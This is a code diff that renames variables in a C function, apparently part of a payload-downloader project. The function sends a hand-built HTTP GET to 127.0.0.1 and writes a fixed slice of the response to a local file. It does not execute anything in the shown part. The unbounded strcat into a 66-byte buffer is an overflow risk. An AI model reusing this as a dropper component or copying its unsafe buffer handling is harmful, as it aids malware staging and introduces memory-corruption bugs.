@@ -14,7 +14,7 @@
 #define BUFFER_SIZE 4096
 #define SA struct sockaddr
 
-int downloadPayload(int sockfd, char *path) {
+int download_payload(int socket_descriptor, char *path) {
   // opening payload
   char *local_path = calloc(13, sizeof(char));
   local_path[0] = '.';
@@ -22,9 +22,9 @@ int downloadPayload(int sockfd, char *path) {
 
   printf("[i] downloading payload in :  '%s'\n", local_path);
 
-  int filefd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+  int file_descriptor = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
 
-  if (filefd == -1) {
+  if (file_descriptor == -1) {
     printf("[x] failed to create or WRONLY open file '%s'\n", local_path);
 
     perror("file creation : ");
@@ -33,14 +33,14 @@ int downloadPayload(int sockfd, char *path) {
   }
 
   // building http header
-  char *http_message = calloc(66, sizeof(char));
-  strcpy(http_message, "GET ");
-  strcat(http_message, path);
-  strcat(http_message, " HTTP/1.1\r\n");
-  strcat(http_message, "Host: 127.0.0.1\r\n");
-  strcat(http_message, "Connection: closed\r\n");
-  strcat(http_message, "\r\n");
-  ssize_t written = write(sockfd, http_message, 66);
+  char *message = calloc(66, sizeof(char));
+  strcpy(message, "GET ");
+  strcat(message, path);
+  strcat(message, " HTTP/1.1\r\n");
+  strcat(message, "Host: 127.0.0.1\r\n");
+  strcat(message, "Connection: closed\r\n");
+  strcat(message, "\r\n");
+  ssize_t written = write(socket_descriptor, message, 66);
 
   if (written == -1) {
     printf("[x] failed to send the http header\n");
@@ -56,11 +56,11 @@ int downloadPayload(int sockfd, char *path) {
     return -1;
   }
 
-  read(sockfd, buffer, 600);
+  read(socket_descriptor, buffer, 600);
 
   printf("[i] web server send us -> %s", buffer + 201);
 
-  written = write(filefd, buffer + 201, 399);
+  written = write(file_descriptor, buffer + 201, 399);
 
   if (written == -1) {
     printf("[x] failed to write to file\n");
@@ -70,8 +70,8 @@ int downloadPayload(int sockfd, char *path) {
 
   printf("successfully retrieved file from server\n");
 
-  close(filefd);
-  close(sockfd);
+  close(file_descriptor);
+  close(socket_descriptor);
 
   return 0;
 }
